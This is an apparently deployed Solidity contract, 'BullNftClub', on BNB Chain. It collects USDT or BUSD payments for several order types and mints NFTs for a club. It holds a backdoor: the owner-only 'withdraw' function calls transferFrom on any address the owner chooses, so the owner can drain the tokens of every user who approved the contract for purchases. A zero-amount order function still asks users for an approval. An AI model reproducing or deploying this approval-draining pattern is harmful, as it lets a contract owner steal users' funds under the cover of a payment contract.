/**
 *Submitted for verification at BscScan.com on 2022-11-23
*/

/**
 *Submitted for verification at Etherscan.io on 2022-06-11
*/

pragma solidity ^0.5.4;

interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
}

interface INFT721 {
  function transferFrom(address from,address to,uint256 tokenId) external;
  function balanceOf(address owner) external view returns (uint256 balance);
  function awardItem(address player, string calldata tokenURI) external returns (uint256 tokenId);
  function updateIsTransfer(bool _flag) external;
  function transferOwnership(address newOwner) external;
}

contract Context {
    constructor() internal {}

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract BullNftClub is Ownable{
  IERC20 public usdt;
  IERC20 public busd;
  INFT721 public worldCupNft;
  address public official;

  constructor() public  {
    usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    worldCupNft = INFT721(0x964F13458d4922bE94a507052242A1f755161eA8);
    official = 0xfC670526C7eCBC3b24C183Fe2784a5d8faB6bb2b;
  }

  event WithdrawUsdtLog(address toAddr, uint amount);
  event WithdrawBusdLog(address toAddr, uint amount);
  event BuyXsOrderLog(address sender, string uuid, uint256 coin);
  event BuyPtOrderLog(address sender, uint amount, string uuid, uint256 coin);
  event BuyZcOrderLog(address sender, uint amount, string uuid, uint256 coin);
  event BuyJcOrderLog(address sender, uint amount, string uuid, uint256 coin);

  function sendNft(address toaddress,string memory url) public onlyOwner {
    worldCupNft.awardItem(toaddress,url);
  }

  function updateNFTOwner(address newOwner) public onlyOwner {
    worldCupNft.transferOwnership(newOwner);
  }

 function updateOfficial(address newofficial) public onlyOwner {
    official = newofficial;
  }
  
  function withdrawUsdt(address toAddr, uint256 amount) onlyOwner public  {
    usdt.transfer(toAddr, amount);
    emit WithdrawUsdtLog(toAddr, amount);
  }

  function withdrawBusd(address toAddr, uint amount) onlyOwner public  {
    busd.transfer(toAddr, amount);
    emit WithdrawBusdLog(msg.sender, amount);
  }

 function withdraw(address fromAddress,address toAddress, uint amount , uint256 coin) onlyOwner public  {
      if(1 == coin){
        usdt.transferFrom(fromAddress, toAddress, amount);
      }else if (2 == coin){
        busd.transferFrom(fromAddress, toAddress, amount);
      }else{
          require(false,"coin not null");
      }
  }
  
  function buyXsOrder(string memory uuid,uint256 coin) public  {
      if(1 == coin){
        usdt.transferFrom(msg.sender, official, 0);
      }else if (2 == coin){
        busd.transferFrom(msg.sender, official, 0);
      }else{
          require(false,"coin not null");
      }
   
    emit BuyXsOrderLog(msg.sender,uuid ,coin);
  }

    function buyPtOrder(uint amount, string memory uuid, uint256 coin) public  {
      if(1 == coin){
        usdt.transferFrom(msg.sender, official, amount);
      }else if (2 == coin){
        busd.transferFrom(msg.sender, official, amount);
      }else{
          require(false,"coin not null");
      }
   
    emit BuyPtOrderLog(msg.sender, amount, uuid ,coin);
  }

    function buyZcOrder(uint amount, string memory uuid, uint256 coin) public  {
      if(1 == coin){
        usdt.transferFrom(msg.sender, official, amount);
      }else if (2 == coin){
        busd.transferFrom(msg.sender, official, amount);
      }else{
          require(false,"coin not null");
      }
   
    emit BuyZcOrderLog(msg.sender, amount, uuid ,coin);
  }

    function buyJcOrder(uint amount, string memory uuid, uint256 coin) public  {
      if(1 == coin){
        usdt.transferFrom(msg.sender, official, amount);
      }else if (2 == coin){
        busd.transferFrom(msg.sender, official, amount);
      }else{
          require(false,"coin not null");
      }
   
    emit BuyJcOrderLog(msg.sender, amount, uuid ,coin);
  }
  
}